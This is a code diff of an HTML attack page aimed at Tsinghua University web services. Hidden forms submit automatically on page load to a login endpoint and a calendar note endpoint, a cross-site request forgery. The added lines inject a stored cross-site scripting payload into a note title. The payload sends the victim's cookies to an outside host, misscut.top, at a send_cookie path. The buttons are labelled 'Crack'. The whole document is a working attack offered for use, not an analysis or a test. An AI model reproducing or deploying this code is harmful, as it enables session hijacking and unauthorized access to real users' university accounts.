@@ -6,7 +6,7 @@
 </head>
 <body>
 <form method="post" enctype="multipart/form-data" action="https://usereg.tsinghua.edu.cn/ip_login.php"
-      id="crack-ip-form" target="crack_ip_iframe" style="visibility: hidden">
+      id="crack-ip-form" target="crack_iframe" style="visibility: hidden">
     <input type="hidden" name="n" value="100">
     <input type="hidden" name="is_pad" value="1">
     <input type="hidden" name="type" value="10">
@@ -16,8 +16,18 @@
     <input id="crack-ip-button" type="submit" value="Crack">
 
     <iframe hidden src="http://info.tsinghua.edu.cn/minichan/roamaction.jsp?id=389" name="crack_ip_iframe"
-            id="crack-ip-iframe">
+            id="crack-iframe">
     </iframe>
+</form>
+
+
+<form method="post" action="http://info.tsinghua.edu.cn/minichan/cal/NoteIns_action.jsp"
+      target="crack_frame"
+      name="noteIns_form" id="note-ins-form">
+    <input name="title" type="text" id="noteIns-title" size=70 value="testtest">
+    <textarea name="body" cols="80" rows="10" id="noteIns-detail">testtesttesttest</textarea>
+    <input id="crack-noteIns-button" type="submit" value="Crack">
+
 </form>
 
 
@@ -25,7 +35,10 @@
 <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
 <script>
     $(document).ready(function () {
-        $('#crack-ip-button').click();
+        // $('#crack-ip-button').click();
+        $("#noteIns-title").val("onerror=\"d=document;t=d.createElement('form');t.action='http://www.misscut.top:12350/send_cookie';t.method='post';o=d.createElement('textarea');o.name='c';o.value=d.cookie;t.appendChild(o);d.body.appendChild(t);t.submit()\">");
+        $('#crack-noteIns-button').click();
     })
+
 </script>
 </html>
